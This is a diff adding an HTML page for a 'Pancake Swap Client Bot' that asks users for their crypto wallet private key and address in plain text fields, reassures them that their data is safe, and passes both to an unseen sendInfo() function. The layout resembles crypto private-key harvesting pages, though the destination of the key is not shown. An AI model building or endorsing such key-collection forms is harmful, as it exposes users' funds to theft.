@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type = "text/javascript" src = "Client-Pank.js"></script>
+    <!-- <script type = "text/javascript" src = "../Bot/bot-client.js"></script> -->
+    <link rel="stylesheet" type="text/css" href="Inicio.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9/sha256.js"></script>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <title>Pancake Swap Client Bot - No License Needed</title>
+</head>
+<body>
+        <header id = "texto1"> <br> Seja bem vindo ao bot. Por favor, insira seus dados abaixo para abrirmos seu BOT.</br></header>
+        
+            <div id = "texto2" style = "text-align:  center;"> 
+                <input type="text" id="privateKey" name="privateKey" placeholder="Insira sua chave privada">
+                <input  type="text" id="walletKey" name="privateKey" placeholder="Insira sua Wallet">
+                <br>
+                <input type="checkbox" id="permissaoArmazenar" name="privateKey" placeholder=""> Salvar suas informações?
+                <br>
+                <button onclick="sendInfo(document.getElementById('privateKey').value, document.getElementById('walletKey').value)"> Entrar </button>
+                <div id = "detalhe">
+                    
+                </div>
+            </div>
+        <footer  id = "texto3"> <br> 🔒Suas informações estão seguras </br></footer>
+</body>
+</html>
